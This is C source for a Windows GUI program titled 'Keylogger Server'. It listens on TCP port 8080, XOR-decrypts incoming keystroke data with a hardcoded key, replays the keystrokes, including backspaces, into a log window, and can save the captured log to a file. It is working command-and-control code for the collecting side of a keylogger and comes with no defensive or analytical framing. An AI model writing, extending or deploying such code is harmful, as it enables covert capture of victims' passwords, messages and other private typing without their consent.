#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 8080
#define WM_SOCKET (WM_USER + 1)
#define MAX_BUFFER 4096
#define ENCRYPTION_KEY "S3cr3tK3y"

char displayBuffer[MAX_BUFFER] = {0};
HWND mainWindow, hEdit;
SOCKET server_fd, client_socket;
RECT clientRect;
HFONT hFont;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void InitServer(HWND hwnd);
void decryptData(char *data);
void SaveLogToFile();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Register window class
    const char CLASS_NAME[] = "Server Window Class";
    
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    
    RegisterClass(&wc);

    // Create window
    mainWindow = CreateWindowEx(
        0,
        CLASS_NAME,
        "Keylogger Server",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        800, 600,
        NULL,
        NULL,
        hInstance,
        NULL
    );

    if (mainWindow == NULL) {
        return 0;
    }

    // Create font
    hFont = CreateFont(
        16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        "Consolas"
    );

    // Create menu
    HMENU hMenu = CreateMenu();
    HMENU hFileMenu = CreatePopupMenu();
    AppendMenu(hFileMenu, MF_STRING, 1001, "Save Log");
    AppendMenu(hFileMenu, MF_STRING, 1002, "Clear Log");
    AppendMenu(hFileMenu, MF_SEPARATOR, 0, NULL);
    AppendMenu(hFileMenu, MF_STRING, 1003, "Exit");
    AppendMenu(hMenu, MF_POPUP, (UINT_PTR)hFileMenu, "File");
    SetMenu(mainWindow, hMenu);

    // Create edit control
    hEdit = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        "EDIT",
        "",
        WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY,
        0, 0, 800, 600,
        mainWindow,
        NULL,
        hInstance,
        NULL
    );
    
    SendMessage(hEdit, WM_SETFONT, (WPARAM)hFont, TRUE);

    ShowWindow(mainWindow, nCmdShow);
    UpdateWindow(mainWindow);
    InitServer(mainWindow);

    // Message loop
    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DeleteObject(hFont);
    return 0;
}

void InitServer(HWND hwnd) {
    WSADATA wsa;
    struct sockaddr_in server_addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        MessageBox(hwnd, "Failed to initialize Winsock", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        MessageBox(hwnd, "Socket creation failed", "Error", MB_OK | MB_ICONERROR);
        WSACleanup();
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        MessageBox(hwnd, "Bind failed", "Error", MB_OK | MB_ICONERROR);
        closesocket(server_fd);
        WSACleanup();
        return;
    }

    if (listen(server_fd, 3) == SOCKET_ERROR) {
        MessageBox(hwnd, "Listen failed", "Error", MB_OK | MB_ICONERROR);
        closesocket(server_fd);
        WSACleanup();
        return;
    }

    WSAAsyncSelect(server_fd, hwnd, WM_SOCKET, FD_ACCEPT | FD_READ | FD_CLOSE);
}

void decryptData(char *data) {
    int key_len = strlen(ENCRYPTION_KEY);
    int data_len = strlen(data);
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ ENCRYPTION_KEY[i % key_len];
    }
}

void SaveLogToFile() {
    OPENFILENAME ofn;
    char szFileName[MAX_PATH] = "";
    
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = mainWindow;
    ofn.lpstrFilter = "Text Files (*.txt)\0*.txt\0All Files (*.*)\0*.*\0";
    ofn.lpstrFile = szFileName;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_EXPLORER | OFN_PATHMUSTEXIST | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
    ofn.lpstrDefExt = "txt";
    
    if (GetSaveFileName(&ofn)) {
        HANDLE hFile = CreateFile(ofn.lpstrFile, GENERIC_WRITE, 0, NULL, 
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD dwTextLength = GetWindowTextLength(hEdit);
            char *pszText = (char*)GlobalAlloc(GPTR, dwTextLength + 1);
            
            if (pszText != NULL) {
                GetWindowText(hEdit, pszText, dwTextLength + 1);
                DWORD dwWritten;
                WriteFile(hFile, pszText, dwTextLength, &dwWritten, NULL);
                GlobalFree(pszText);
            }
            
            CloseHandle(hFile);
        }
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_SIZE: {
            RECT rcClient;
            GetClientRect(hwnd, &rcClient);
            SetWindowPos(hEdit, NULL, 0, 0, rcClient.right, rcClient.bottom, SWP_NOZORDER);
            return 0;
        }

        case WM_COMMAND: {
            switch (LOWORD(wParam)) {
                case 1001: // Save Log
                    SaveLogToFile();
                    break;
                    
                case 1002: // Clear Log
                    SetWindowText(hEdit, "");
                    break;
                    
                case 1003: // Exit
                    PostMessage(hwnd, WM_CLOSE, 0, 0);
                    break;
            }
            return 0;
        }

        case WM_SOCKET: {
            if (WSAGETSELECTERROR(lParam)) {
                closesocket((SOCKET)wParam);
                return 0;
            }

            switch (WSAGETSELECTEVENT(lParam)) {
                case FD_ACCEPT: {
                    client_socket = accept(server_fd, NULL, NULL);
                    if (client_socket == INVALID_SOCKET) {
                        MessageBox(hwnd, "Accept failed", "Error", MB_OK | MB_ICONERROR);
                        return 0;
                    }
                    WSAAsyncSelect(client_socket, hwnd, WM_SOCKET, FD_READ | FD_CLOSE);
                    break;
                }
                
                case FD_READ: {
                    char buffer[1024] = {0};
                    int bytes_read = recv(client_socket, buffer, sizeof(buffer), 0);
                    if (bytes_read > 0) {
                        buffer[bytes_read] = '\0';
                        decryptData(buffer);
                        
                        // Get current text length
                        int textLength = GetWindowTextLength(hEdit);
                        
                        // Move caret to end
                        SendMessage(hEdit, EM_SETSEL, (WPARAM)textLength, (LPARAM)textLength);
                        
                        // Handle backspace
                        if (buffer[0] == '\b') {
                            if (textLength > 0) {
                                SendMessage(hEdit, EM_SETSEL, (WPARAM)textLength-1, (LPARAM)textLength);
                                SendMessage(hEdit, EM_REPLACESEL, 0, (LPARAM)"");
                            }
                        } else {
                            // Replace newlines with Windows newlines
                            char *p = buffer;
                            while (*p) {
                                if (*p == '\n') {
                                    SendMessage(hEdit, EM_REPLACESEL, 0, (LPARAM)"\r\n");
                                    p++;
                                } else {
                                    char temp[2] = {*p, '\0'};
                                    SendMessage(hEdit, EM_REPLACESEL, 0, (LPARAM)temp);
                                    p++;
                                }
                            }
                        }
                    }
                    break;
                }

                case FD_CLOSE: {
                    closesocket(client_socket);
                    break;
                }
            }
            return 0;
        }

        case WM_DESTROY: {
            closesocket(client_socket);
            closesocket(server_fd);
            WSACleanup();
            PostQuitMessage(0);
            return 0;
        }

        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}